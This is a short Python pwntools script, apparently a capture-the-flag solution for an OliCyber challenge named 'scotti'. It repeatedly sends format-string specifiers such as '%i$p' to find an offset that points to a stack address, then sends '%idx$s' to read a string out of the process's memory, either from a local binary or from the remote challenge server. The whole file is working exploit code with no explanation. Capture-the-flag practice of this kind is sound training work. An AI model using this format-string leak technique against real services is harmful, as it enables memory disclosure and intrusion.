#!/usr/bin/env python3
from pwn import *

idx = 0
for i in range(1, 100):
    if args["REMOTE"]:
        r = remote('scotti.challs.olicyber.it', 12202)
    else:
        r = process('./scotti')

    r.recvuntil(b'risposta? ')
    r.sendline(b'.. ' + str(f'%{i}$p').encode() + b' ..')
    r.recvuntil(b'..')
    data = r.recvuntil(b'..')
    if b'0x7' in data: # stack address
        idx = i+1
        break
    r.close()

if args["REMOTE"]:
    r = remote('scotti.challs.olicyber.it', 12202)
else:
    r = process('./scotti')

print(idx)
r.recvuntil(b'risposta? ')
r.sendline(str(f'%{idx}$s!').encode())
r.recvline()
data = r.recvuntil(b'!')[:-1]
print(data.decode())
